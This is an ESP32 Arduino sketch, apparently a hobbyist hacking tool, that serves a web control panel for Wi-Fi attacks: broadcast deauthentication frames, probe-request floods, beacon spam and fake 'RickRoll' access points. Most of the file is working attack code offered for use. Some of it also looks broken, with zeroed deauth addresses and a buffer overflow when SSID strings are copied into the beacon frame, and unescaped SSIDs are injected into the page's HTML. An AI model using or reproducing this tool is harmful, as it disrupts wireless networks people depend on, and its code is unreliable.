#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>

// A code created by ViperFSFA
// Unethical use is illigal!!
// #Hacktheplanet
// Access the toolbar at: http://192.168.4.1/

// Customise the SSID and password here
const char* ssid = "Vipers ESP32 Toolbar";
const char* password = "deauther123";

WebServer server(80);


uint8_t deauthFrame[26] = {
  0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};


uint8_t beaconFrame[50] = {
  0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0xc0, 0x6c, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0x07, 0x08, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x07, 0x08, 0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01
};

void setup() {
  Serial.begin(115200);
  

  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);


  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_start();

  // Serve web interface
  server.on("/", HTTP_GET, handleRoot);
  server.on("/deauth", HTTP_GET, handleDeauth);
  server.on("/probe", HTTP_GET, handleProbe);
  server.on("/beacon", HTTP_GET, handleBeacon);
  server.on("/rickroll", HTTP_GET, handleRickRoll);
  server.on("/scan", HTTP_GET, handleScan);
  
  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  server.handleClient();
}

void handleRoot() {
  String html = R"=====(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, sans-serif;
  background-color: #121212;
  color: #ffffff;
  margin: 0;
  padding: 20px;
}
.container {
  max-width: 800px;
  margin: 0 auto;
  background-color: #1e1e1e;
  padding: 20px;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0,0,0,0.5);
}
h1 {
  color: #ff5555;
  text-align: center;
}
.network-list {
  margin: 20px 0;
  max-height: 300px;
  overflow-y: auto;
  background-color: #2d2d2d;
  padding: 10px;
  border-radius: 5px;
}
.network-item {
  padding: 10px;
  margin: 5px 0;
  background-color: #3d3d3d;
  border-radius: 5px;
}
button {
  background-color: #ff5555;
  color: white;
  border: none;
  padding: 10px 15px;
  margin: 5px;
  border-radius: 5px;
  cursor: pointer;
  font-weight: bold;
  transition: background-color 0.3s;
}
button:hover {
  background-color: #ff3333;
}
.controls {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  margin: 20px 0;
}
.status {
  text-align: center;
  margin: 10px 0;
  padding: 10px;
  background-color: #333;
  border-radius: 5px;
}
</style>
</head>
<body>
<div class="container">
  <h1>ESP32 Wi-Fi Toolbar by: ViperFSFA</h1>
  <div class="controls">
    <button onclick="deauth()">Deauth All</button>
    <button onclick="probe()">Probe Flood</button>
    <button onclick="beacon()">Beacon Spam</button>
    <button onclick="rickroll()">RickRoll APs</button>
    <button onclick="scanNetworks()">Scan Networks</button>
  </div>
  <div class="status" id="status">Ready</div>
  <div class="network-list">
    <h3>Available Networks:</h3>
    <div id="networks">No networks scanned yet</div>
  </div>
</div>
<script>
function setStatus(msg) {
  document.getElementById('status').innerHTML = msg;
}

function deauth() {
  setStatus("Sending deauth packets...");
  fetch('/deauth')
    .then(response => response.text())
    .then(data => setStatus(data))
    .catch(err => setStatus("Error: " + err));
}

function probe() {
  setStatus("Sending probe requests...");
  fetch('/probe')
    .then(response => response.text())
    .then(data => setStatus(data))
    .catch(err => setStatus("Error: " + err));
}

function beacon() {
  setStatus("Spamming beacon frames...");
  fetch('/beacon')
    .then(response => response.text())
    .then(data => setStatus(data))
    .catch(err => setStatus("Error: " + err));
}

function rickroll() {
  setStatus("Creating RickRoll APs...");
  fetch('/rickroll')
    .then(response => response.text())
    .then(data => setStatus(data))
    .catch(err => setStatus("Error: " + err));
}

function scanNetworks() {
  setStatus("Scanning for networks...");
  fetch('/scan')
    .then(response => response.json())
    .then(data => {
      let networksHTML = "";
      data.forEach(net => {
        networksHTML += `<div class="network-item">
          <strong>${net.ssid || 'Hidden'}</strong> (${net.rssi} dBm) - ${net.channel} Ch
        </div>`;
      });
      document.getElementById('networks').innerHTML = networksHTML;
      setStatus(`Found ${data.length} networks`);
    })
    .catch(err => setStatus("Error: " + err));
}
</script>
</body>
</html>
)=====";
  server.send(200, "text/html", html);
}

void handleDeauth() {

  for(int i=0; i<10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    delay(100);
  }
  server.send(200, "text/plain", "Deauthentication packets sent!");
}

void handleProbe() {

  uint8_t probeFrame[26] = {0x40, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  
  for(int i=0; i<20; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, probeFrame, sizeof(probeFrame), false);
    delay(50);
  }
  server.send(200, "text/plain", "Probe requests sent!");
}

void handleBeacon() {
  for(int i=0; i<10; i++) {
    for(int j=38; j<46; j++) {
      beaconFrame[j] = random(256);
    }
    esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, sizeof(beaconFrame), false);
    delay(100);
  }
  server.send(200, "text/plain", "Beacon frames spammed!");
}

void handleRickRoll() {

  const char* rickNames[] = {
    "Never Gonna Give You Up",
    "Never Gonna Let You Down",
    "Never Gonna Run Around",
    "And Desert You",
    "RickRoll",
    "Rick Astley"
  };
  
  for(int i=0; i<6; i++) {
    // Modify beacon frame with RickRoll SSID
    memcpy(&beaconFrame[38], rickNames[i], strlen(rickNames[i]));
    esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, sizeof(beaconFrame), false);
    delay(100);
  }
  server.send(200, "text/plain", "RickRoll APs created!");
}

void handleScan() {
  // Scan for nearby networks
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; ++i) {
    if(i) json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"channel\":" + String(WiFi.channel(i));
    json += "}";
  }
  json += "]";
  server.send(200, "application/json", json);
  WiFi.scanDelete();
}
